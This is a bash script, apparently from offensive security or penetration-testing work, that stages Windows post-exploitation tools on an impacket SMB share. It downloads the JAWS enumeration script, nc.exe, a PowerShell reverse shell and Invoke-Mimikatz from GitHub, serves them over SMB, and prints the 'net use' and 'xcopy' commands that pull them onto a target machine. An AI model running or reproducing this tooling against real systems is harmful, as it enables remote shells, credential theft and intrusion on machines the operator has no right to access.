#!/bin/bash

####################################################################################
#
#      Script will use impacket to build SMB share and host windows binaries/scripts
#
####################################################################################
#  Requires: impacket installed in /opt/impacket
#  Install:  cd /opt/ & git clone https://github.com/SecureAuthCorp/impacket.git
###################################################################################

# set working dir
echo "[*] setting working directory"
mkdir /tmp/SMB
cd /tmp/SMB

# download filesa for SMB staging
echo " "
echo "[*] Downloading stageables"
echo " "
	echo "-[+] Downloading JAWS.ps1"
	wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/WinPrivEsc/jaws-enum.ps1 -O jaws.ps1

	echo "-[+] Download NC.exe"
	wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/WinPrivEsc/nc.exe -O nc.exe

	echo "-[+] Downloading Powershell Reverse Shell"
	wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/WinPrivEsc/PowershellReverseShell.ps1 -O revshell.ps1
	
	echo "-[+] Downloading Mimikatz"
	wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 -O mkatz.ps1


# setting up SMB share using impacket
echo " "
echo "[*] Staging SMB share"
echo " "
	echo "[------------------------------------------------------------------------------------------------]"
	echo "                                      MAP DRIVES USING                                            "
		ip -4 addr | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | while read ip ; do
   			echo  net use x: \\\\$ip\\SMB
		done
	echo "                                    MOVE CONTENTS TO TMP                                         "
	echo "xcopy x:\ /h/i/c/k/e/r/y                                                         "
	echo "[------------------------------------------------------------------------------------------------]"

	python /opt/impacket/examples/smbserver.py SMB /tmp/SMB
